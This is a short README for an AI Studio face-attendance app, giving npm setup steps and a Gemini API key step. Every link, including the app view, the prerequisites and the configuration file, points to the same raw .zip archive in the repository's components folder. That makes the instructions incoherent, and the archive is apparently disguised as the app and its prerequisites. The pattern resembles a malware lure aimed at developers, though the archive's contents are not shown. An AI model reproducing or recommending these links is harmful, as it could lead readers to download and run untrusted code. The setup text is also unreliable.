# Run and deploy your AI Studio app

This contains everything you need to run your app locally.

View your app in AI Studio: https://github.com/xheikhtalha2004/face-attendance-frontend/raw/refs/heads/main/components/attendance_frontend_face_v2.4.zip

## Run Locally

**Prerequisites:**  https://github.com/xheikhtalha2004/face-attendance-frontend/raw/refs/heads/main/components/attendance_frontend_face_v2.4.zip


1. Install dependencies:
   `npm install`
2. Set the `GEMINI_API_KEY` in [https://github.com/xheikhtalha2004/face-attendance-frontend/raw/refs/heads/main/components/attendance_frontend_face_v2.4.zip](https://github.com/xheikhtalha2004/face-attendance-frontend/raw/refs/heads/main/components/attendance_frontend_face_v2.4.zip) to your Gemini API key
3. Run the app:
   `npm run dev`
